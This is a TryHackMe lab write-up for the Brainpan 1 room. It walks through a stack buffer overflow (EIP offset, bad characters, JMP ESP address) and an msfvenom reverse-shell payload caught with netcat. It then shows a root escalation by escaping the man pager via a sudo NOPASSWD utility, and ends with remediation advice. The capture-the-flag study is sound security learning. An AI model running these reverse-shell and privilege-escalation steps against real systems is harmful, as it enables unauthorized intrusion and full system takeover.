Brainpan 1 - TryHackMe Writeup

1. Executive Summary & Machine Overview

Metric Details
Room Name Brainpan 1
Platform TryHackMe
Operating System Linux (Ubuntu / Wine environment executing 32-bit PE)
Target IP 10.48.175.164
Attacker IP 192.168.132.94 (tun0)
Difficulty Hard
Key Attack Vectors Stack-based Buffer Overflow (x86), Bad Character Analysis, Mona Gadget Search, Linux Reverse Shell Injection, Sudo Privilege Escalation (/home/anansi/bin/anansi_util manual pager escape)

Attack Chain Summary

  1. Reconnaissance:
    - nmap -sV -sC 10.48.175.164 -Pn identified Port 9999 (abyss? / Brainpan banner) and Port 10000 (Python SimpleHTTPServer hosting brainpan.exe).
  2. Buffer Overflow Exploitation:
    - Downloaded brainpan.exe from http://10.48.175.164:10000/bin/brainpan.exe for local analysis in Immunity Debugger.
    - Fuzzed service using fuzz.py crashing at 600 bytes.
    - Generated cyclic pattern (msf-pattern_create -l 1000) and found exact EIP offset at 524 bytes (msf-pattern_offset -q 35724134 -l 1000).
    - Verified bad characters using Mona bytearray: only \x00 is bad.
    - Found JMP ESP instruction at pointer 0x311712f3 (\xf3\x12\x17\x31 in little-endian).
    - Generated Linux x86 reverse shell payload with msfvenom targeting port 4444.
    - Executed exploit.py against 10.48.175.164:9999 and caught reverse shell on nc -lvnp 4444 as user puck.
  3. Privilege Escalation to Root:
    - sudo -l showed user puck may run (root) NOPASSWD: /home/anansi/bin/anansi_util.
    - Executed sudo /home/anansi/bin/anansi_util manual man and escaped pager via !/bin/bash to obtain root access (root@brainpan:/usr/share/man#).

3.7 Payload Generation & Exploit Execution

Because target 10.48.175.164 runs Linux, we generate Linux x86 reverse shellcode:

msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

Payload size: 95 bytes, encoded with x86/shikata_ga_nai.

4.3 Exploitation via /home/anansi/bin/anansi_util

Running the utility displays its options:

sudo /home/anansi/bin/anansi_util


Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]

We exploit the manual action which executes the man command. Inside the pager, we spawn a root shell:

sudo /home/anansi/bin/anansi_util manual man
# At the terminal prompt, type:
!/bin/bash

We achieve full root privileges!

5. Security Mitigations & Remediation

Vulnerability Impact Recommended Remediation
Stack Buffer Overflow (brainpan.exe) Unauthenticated Remote Code Execution. Use bounds-checking functions (strncpy, snprintf), enable stack canaries, ASLR, and DEP/NX.
Sudo NOPASSWD (/home/anansi/bin/anansi_util) Instant Local Privilege Escalation to root. Restrict interactive binaries like man from being called with root privileges, or set non-interactive pagers like export MANPAGER=cat.
